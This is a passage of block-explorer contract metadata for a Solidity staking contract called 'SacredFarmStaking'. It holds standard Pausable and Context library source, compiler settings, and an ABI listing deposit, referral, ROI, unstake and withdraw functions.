_ENTERED;\\n    }\\n}\\n\"\r\n    },\r\n    \"contracts/utils/Pausable.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.7.0) (security/Pausable.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./Context.sol\\\";\\n\\nabstract contract Pausable is Context {\\n    event Paused(address account);\\n    event Unpaused(address account);\\n    bool private _paused;\\n\\n    constructor() {\\n        _paused = false;\\n    }\\n\\n    modifier whenNotPaused() {\\n        _requireNotPaused();\\n        _;\\n    }\\n    modifier whenPaused() {\\n        _requirePaused();\\n        _;\\n    }\\n    function paused() public view virtual returns (bool) {\\n        return _paused;\\n    }\\n    function _requireNotPaused() internal view virtual {\\n        require(!paused(), \\\"Pausable: paused\\\");\\n    }\\n    function _requirePaused() internal view virtual {\\n        require(paused(), \\\"Pausable: not paused\\\");\\n    }\\n    function _pause() internal virtual whenNotPaused {\\n        _paused = true;\\n        emit Paused(_msgSender());\\n    }\\n    function _unpause() internal virtual whenPaused {\\n        _paused = false;\\n        emit Unpaused(_msgSender());\\n    }\\n}\\n\"\r\n    },\r\n    \"contracts/utils/Context.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.6;\\n\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"metadata\": {\r\n      \"useLiteralContent\": true\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"cardTime\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"Paused\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"}],\"name\":\"Register\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"Unpaused\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Percents_100\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Percents_200\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Percents_400\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Percents_600\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"SFToken\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_defaultRefer\",\"type\":\"address\"}],\"name\":\"UpdateDefaultRefer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_multiplier\",\"type\":\"uint256\"}],\"name\":\"UpdateMultiplier\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"users\",\"type\":\"address\"}],\"name\":\"UpdateROI\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"users\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"levels\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"userlevels\",\"type\":\"uint256\"}],\"name\":\"UpdateROIInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"users\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"levels\",\"type\":\"uint256\"}],\"name\":\"UpdateROIInfo1\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"UserAdress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"UserDepoisteamount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"_totalUser\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"_totalUserAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"_userAddressVerification\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"countUser\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"countUser1\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"defaultRefer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tokenAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_cardTime\",\"type\":\"uint256\"}],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"depositors\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"devWallets\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"feePercentages\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCurDay\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getDepositorsLength\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"getDirectsAndROI\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"getDirectsamount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"getFlushAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"getMaxFreezing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"getOrderLength\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"getRewards\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"_reward_100\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_reward_200\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_reward_400\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_reward_600\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"getTeamDeposit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_layer\",\"type\":\"uint256\"}],\"name\":\"getTeamUsersLength\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_day\",\"type\":\"uint256\"}],\"name\":\"getTotalDay\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastDistribute\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAmountWithdraw\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"multiplier\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"orderInfos\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"cardDays\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"start\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"unStakeTime\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"isUnStake\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pauseContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"paused\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_referral\",\"type\":\"address\"}],\"name\":\"register\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"revWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"rewardInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"directs\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"claimedDirectsandAffiliate\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_Rewards\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"rewardReceived\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"teamUsers\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user1\",\"type\":\"address\"}],\"name\":\"totalDeposite\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalUser\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"unPauseContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"Unstake_cardTime\",\"type\":\"uint256\"}],\"name\":\"unstake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"Unstake_cardTime\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"User_\",\"type\":\"address\"}],\"name\":\"unstakeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"updateReferral\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"userCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"userInfo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"start\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxDeposit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalDeposit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalDepositAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"teamNum\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"directsNum\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxDirectDeposit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"teamTotalDeposit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalStake_100\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalStake_200\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalStake_400\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalStake_600\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"userReferral\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"withdrwa_cardTime\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawDirectsandROI\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SacredFarmStaking", "CompilerVersion": "v0.8.6+commit.11564f7e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}